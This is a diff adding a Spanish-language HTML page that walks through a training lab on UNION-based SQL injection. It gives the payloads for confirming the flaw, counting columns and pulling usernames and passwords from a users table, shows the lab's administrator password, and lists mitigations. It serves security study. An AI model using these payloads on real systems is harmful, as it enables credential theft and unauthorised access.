@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 9 - Retrieving Data From Other Tables</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 9</h2>
+<p>SQL injection UNION attack, retrieving data from other tables</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+<p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Extraer los valores de <strong>username</strong> y <strong>password</strong>
+de la tabla <strong>users</strong> y utilizar las credenciales
+para iniciar sesión como administrador.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Confirmar SQL Injection</strong></p>
+
+<pre>
+'
+</pre>
+
+<p>
+La consulta se rompe y el servidor devuelve error.
+</p>
+
+
+<p><strong>Paso 2 – Determinar columnas</strong></p>
+
+<pre>
+'+UNION+SELECT+NULL,NULL--
+</pre>
+
+<p>
+El servidor responde correctamente,
+indicando que existen <strong>2 columnas</strong>.
+</p>
+
+
+<p><strong>Paso 3 – Probar texto</strong></p>
+
+<pre>
+'+UNION+SELECT+'abc','def'--
+</pre>
+
+<p>
+Las cadenas aparecen en la página.
+</p>
+
+
+<p><strong>Paso 4 – Extraer credenciales</strong></p>
+
+<pre>
+'+UNION+SELECT+username,password+FROM+users--
+</pre>
+
+<p>
+Se muestran los usuarios y contraseñas
+de la base de datos.
+</p>
+
+
+<p><strong>Paso 5 – Login</strong></p>
+
+<p>
+Se inicia sesión con:
+</p>
+
+<pre>
+Username: administrator
+Password: goc321j92ofkd0naozyx
+</pre>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Consultas parametrizadas.</li>
+
+<li>Validación de entradas.</li>
+
+<li>Principio de mínimo privilegio.</li>
+
+<li>Uso de WAF.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
